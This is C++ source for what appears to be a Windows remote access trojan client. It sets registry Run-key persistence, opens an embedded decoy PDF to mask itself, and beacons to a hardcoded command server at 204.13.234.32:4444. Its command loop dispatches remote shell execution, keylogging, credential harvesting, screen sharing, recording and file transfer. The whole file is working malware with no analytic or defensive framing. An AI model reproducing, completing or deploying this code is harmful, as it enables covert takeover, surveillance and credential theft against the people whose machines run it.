// --- STUBS AND SIGNATURE FIXES FOR COMMAND HANDLERS ---
#include "sockets.h"
#include "wrappers.h"
#include <iostream>
#include <string>

#include <cstdlib>
#include <fstream>
#include <vector>


#include <cstdio>
#include <memory>
#include <array>
#include "pdf_data.h" 
#include <random>
#include <sstream>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include "screen_share.h"
#include "file_manager.h"
#include "process_manager.h"
#include "system_info.h"
#include "keylogger.h"

#include "shell.h"
#include "power_control.h"
#include "clipboard.h"


#include "file_transfer.h"

#include "recording.h"
#include "help.h"
#include "security.h"
#include "utils.h"
#include "json.hpp"
#include "resource.h"
#include "handle_security.h"
#include "handle_file_transfer.h"

#include <filesystem>




using json = nlohmann::json;

sock_t connect_to_server(const char* host, const char* port) {
    struct addrinfo hints{}, *res, *p;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0) return SOCKET_ERR;
    sock_t sock = SOCKET_ERR;
    for (p = res; p; p = p->ai_next) {
        sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sock == SOCKET_ERR) continue;
        if (connect(sock, p->ai_addr, p->ai_addrlen) != SOCKET_ERR) break;
        CLOSESOCKET(sock);
        sock = SOCKET_ERR;
    }
    freeaddrinfo(res);
    return sock;
}

#ifdef _WIN32
#include <windows.h>
#include <shellapi.h>



void add_to_startup_registry(const char* appName) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return;
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, appName, 0, REG_SZ,
            (const BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(key);
    }
}
#endif






#include <windows.h>
#include <winsock2.h>
#include <shellapi.h>
#include <tchar.h>



std::string generate_uuid() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 15);
    static std::uniform_int_distribution<> dis2(8, 11);

    std::stringstream ss;
    ss << std::hex;
    for (int i = 0; i < 8; i++) ss << dis(gen);
    ss << "-";
    for (int i = 0; i < 4; i++) ss << dis(gen);
    ss << "-4"; // version 4 UUID
    for (int i = 0; i < 3; i++) ss << dis(gen);
    ss << "-";
    ss << dis2(gen);
    for (int i = 0; i < 3; i++) ss << dis(gen);
    ss << "-";
    for (int i = 0; i < 12; i++) ss << dis(gen);
    return ss.str();
}


std::string generate_persistent_id() {
    char* appData = getenv("APPDATA");
    if (appData) {
        std::string path = std::string(appData) + "\\machine_id.txt";
        std::cout << path << std::endl;

        if (std::filesystem::exists(path)) {
            std::ifstream in(path);
            std::string id;
            std::getline(in, id);
            if (!id.empty()) return id;
        }

        // Generate random UUID-like ID
        std::stringstream ss;
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        for (int i = 0; i < 32; ++i) {
            ss << std::hex << dis(gen);
        }
        std::string id = ss.str();

        std::ofstream out(path);
        out << id;
        return id;
    }
}

 std::string client_id = generate_persistent_id();  // ✅ stays the same for each machine


    #include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <string>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")


std::string get_real_ip() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    PIP_ADAPTER_ADDRESSES adapter_addresses = nullptr;
    ULONG out_buf_len = 0;
    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                  GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_INCLUDE_PREFIX;

    // First call to get size
    GetAdaptersAddresses(AF_INET, flags, nullptr, adapter_addresses, &out_buf_len);
    adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(out_buf_len);

    if (GetAdaptersAddresses(AF_INET, flags, nullptr, adapter_addresses, &out_buf_len) == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES adapter = adapter_addresses; adapter; adapter = adapter->Next) {
            // Skip loopback and disconnected adapters
            if (adapter->OperStatus != IfOperStatusUp || adapter->IfType == IF_TYPE_SOFTWARE_LOOPBACK)
                continue;

            for (PIP_ADAPTER_UNICAST_ADDRESS ua = adapter->FirstUnicastAddress; ua; ua = ua->Next) {
                SOCKADDR_IN* sa_in = (SOCKADDR_IN*)ua->Address.lpSockaddr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sa_in->sin_addr, ip, sizeof(ip));
                if (strcmp(ip, "68.168.222.167") != 0) {
                    free(adapter_addresses);
                    WSACleanup();
                    return std::string(ip);
                }
            }
        }
    }

    free(adapter_addresses);
    WSACleanup();
    return "Unknown IP";
}


 




// NEW: Simple heartbeat function
void send_heartbeat(sock_t sock) {
    json heartbeat_json = {
        {"client", client_id},
        {"type", "heartbeat"},
        {"cmd", "HEARTBEAT"}
    };
    
    std::string heartbeat = heartbeat_json.dump();
    uint32_t len = htonl(heartbeat.size());
    send_all(sock, reinterpret_cast<char*>(&len), sizeof(len));
    send_all(sock, heartbeat.c_str(), heartbeat.size());
    
    printf("[HEARTBEAT] Sent from %s\n", client_id.c_str());
}

void send_handshake(sock_t sock) {
   
    std::string ip_addr = get_real_ip();
    printf("[HANDSHAKE] Client ID: %s, IP: %s\n", client_id.c_str(), ip_addr.c_str());

    json sysinfo = get_system_info_json();
    sysinfo["ip"] = ip_addr;
    sysinfo["online"] = true;

     

    json handshake_json = {
        {"cmd", "SYSTEM_INFO"},
        {"client", client_id},     // ✅ fixed unique ID per machine
        {"session", client_id},    // ✅ same as client for tracking
        {"result", sysinfo.dump()}
    };

    std::string handshake = handshake_json.dump();
    uint32_t len = htonl(handshake.size());
    send_all(sock, reinterpret_cast<char*>(&len), sizeof(len));
    send_all(sock, handshake.c_str(), handshake.size());

    static auto last_heartbeat = std::chrono::steady_clock::now();
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_heartbeat).count();
        
    if (elapsed >= 10) {
        send_heartbeat(sock);
        last_heartbeat = now;
    }


    printf("[HANDSHAKE] Sent system info for client ID: %s, IP: %s\n",
           client_id.c_str(), ip_addr.c_str());
}





void handle_commands(sock_t sock) {
    char length_buf[4];
    printf("Handling command...\n");
    

    auto last_ping = std::chrono::steady_clock::now();

    while (true) {

        // ⏳ Wait for socket OR timeout (2 seconds)
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(sock, &rfds);

        timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;

        int ret = select((int)sock + 1, &rfds, nullptr, nullptr, &tv);

        if (ret == 0) {
            // ⏱ timeout → send ping (NO polling)
            json ping = { {"cmd", "PING"}, {"client", client_id} };
            std::string ping_str = ping.dump();
            uint32_t len = htonl(ping_str.size());
            send_all(sock, reinterpret_cast<char*>(&len), sizeof(len));
            send_all(sock, ping_str.c_str(), ping_str.size());
            continue;
        }

        if (ret < 0) {
            printf("select() error\n");
            break;
        }

        // ✅ Data available — BLOCKING recv
        if (!recv_all(sock, length_buf, 4)) break;

        uint32_t len = ntohl(*reinterpret_cast<uint32_t*>(length_buf));
        if (len == 0) continue;

        std::string payload(len, '\0');
        if (!recv_all(sock, &payload[0], len)) break;

        json msg = json::parse(payload);

        std::string command = msg.value("command", "");
        std::string client = msg.value("client", "");
        json cmd_payload = msg.value("payload", json::object());

        
            printf("Received command: %s\n", command.c_str());

            if (command == "EXIT") break;
            else if (command == "TERMINAL")
                send_result(sock, cmd_payload, client, exec_command(cmd_payload.value("cmd", "")));
            else if (command == "SCREEN_SHARE") handle_screen_share(sock, cmd_payload, client);
            else if (command == "CREDENTIAL") start_credential_manager(sock, cmd_payload, client);
            else if (command == "FILE_MANAGER") open_file_manager(sock, cmd_payload, client);
            else if (command == "PROCESS_MANAGER") open_process_manager(sock, cmd_payload, client);
            else if (command == "SYSTEM_INFO") send_system_info(sock, cmd_payload, client);
            else if (command == "POWER_CONTROL") handle_power_control(sock, cmd_payload, client);
            else if (command == "CLIPBOARD") sync_clipboard(sock, cmd_payload, client);
            
            else if (command == "SESSION_MANAGER") manage_sessions(sock, cmd_payload, client);
            else if (command == "TRANSFER") handle_file_transfer(sock, cmd_payload, client);
            else if (command == "RECORDING") start_recording(sock, cmd_payload, client);
            else if (command == "HELP_PANEL") show_help(sock, cmd_payload, client);
            else if (command == "SECURITY") handle_security(sock, cmd_payload, client);
            else if (command == "KEYLOGGER") handle_keylogger(sock, cmd_payload, client);
            else send_result(sock, cmd_payload, client, "Unknown command");

       
    }
}



int ExtractAndOpenPDF() {
    #ifdef _WIN32
    // Find PDF resource
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_PDFFILE), RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return 1;

    DWORD size = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    if (!pData) return 1;

    // Get temp path
    char tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) return 1;

    // Generate unique temp file with .pdf extension
    char tempFile[MAX_PATH];
    if (!GetTempFileNameA(tempPath, "PDF", 0, tempFile)) return 1;

    std::string pdfFile = std::string(tempFile) + ".pdf";
    MoveFileA(tempFile, pdfFile.c_str());

    // Write resource data into file
    std::ofstream out(pdfFile, std::ios::binary);
    out.write(reinterpret_cast<char*>(pData), size);
    out.close();

    // Open PDF with default viewer
    HINSTANCE res = ShellExecuteA(NULL, "open", pdfFile.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((INT_PTR)res <= 32) {
        DeleteFileA(pdfFile.c_str()); // clean up if failed to open
        return 1;
    }

    // Do NOT delete immediately → will crash if still in use
    // Instead schedule it for deletion after reboot
    MoveFileExA(pdfFile.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    #endif
    return 0;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0); // Disable buffering for stdout
    setvbuf(stderr, NULL, _IONBF, 0); // Optional: disable for stderr too
    if (!init_sockets()) return 1;

    
        add_to_startup_registry("MyCPPClient");
        // Find PDF resource
        ExtractAndOpenPDF();

  

        while (true) {
            sock_t sock = connect_to_server("204.13.234.32", "4444");
            if (sock == SOCKET_ERR) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
                continue;
            }
            // 🔹 Send handshake first
                send_handshake(sock);
                handle_commands(sock);
                // CLOSESOCKET(sock);
        }

        // cleanup_sockets();
        // return 0;
}